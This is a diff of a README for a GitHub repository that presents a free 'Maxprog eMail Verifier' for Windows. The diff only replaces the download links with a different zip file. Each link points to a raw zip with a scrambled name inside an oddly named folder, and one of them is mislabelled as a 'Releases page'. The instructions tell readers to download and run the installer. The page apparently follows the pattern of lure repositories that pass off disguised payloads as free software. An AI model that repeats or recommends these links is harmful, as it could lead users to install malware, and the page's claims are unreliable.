@@ -1,7 +1,7 @@
 # 📬 Maxprog-eMail-Verifier-Free - Validate Emails with Ease
 
 ## 📥 Download Now
-[![Download Maxprog eMail Verifier](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Verifier_Free_e_Maxprog_Mail_v1.0.zip)](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Verifier_Free_e_Maxprog_Mail_v1.0.zip)
+[![Download Maxprog eMail Verifier](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Free_Verifier_Maxprog_Mail_e_v2.1.zip)](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Free_Verifier_Maxprog_Mail_e_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Maxprog eMail Verifier, a tool designed for Windows PCs that helps you easily validate email addresses. This software streamlines your email verification process, making it efficient and straightforward. 
@@ -29,7 +29,7 @@ You can find detailed guides and reference materials to help you get the most ou
 ## 📦 Download & Install
 To use Maxprog eMail Verifier, follow these steps:
 
-1. **Visit the Download Page**: Go to our [Releases page](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Verifier_Free_e_Maxprog_Mail_v1.0.zip) to find the latest version of the application.
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Free_Verifier_Maxprog_Mail_e_v2.1.zip) to find the latest version of the application.
 2. **Download the Installer**: Click on the version you want to download. This will usually be the latest version.
 3. **Run the Installer**: After downloading, locate the installer file (it should be in your Downloads folder) and double-click it to start the installation process. Follow the prompts to complete the installation.
 4. **Launch the Application**: Once installed, find the Maxprog eMail Verifier in your Start menu or desktop. Click to open it and start verifying emails.
@@ -45,7 +45,7 @@ For any further assistance, feel free to reach out via the contact details provi
 
 Maxprog eMail Verifier empowers you to manage your email lists effectively. Follow the steps above to get started today!
 
-[![Download Maxprog eMail Verifier](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Verifier_Free_e_Maxprog_Mail_v1.0.zip)](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Verifier_Free_e_Maxprog_Mail_v1.0.zip)
+[![Download Maxprog eMail Verifier](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Free_Verifier_Maxprog_Mail_e_v2.1.zip)](https://github.com/sidhu677/Maxprog-eMail-Verifier-Free/raw/refs/heads/main/bescutcheon/Free_Verifier_Maxprog_Mail_e_v2.1.zip)
 
 ## 🔗 Related Topics
 - **Email Syntax Checker**: Ensure your email addresses follow standard formatting.
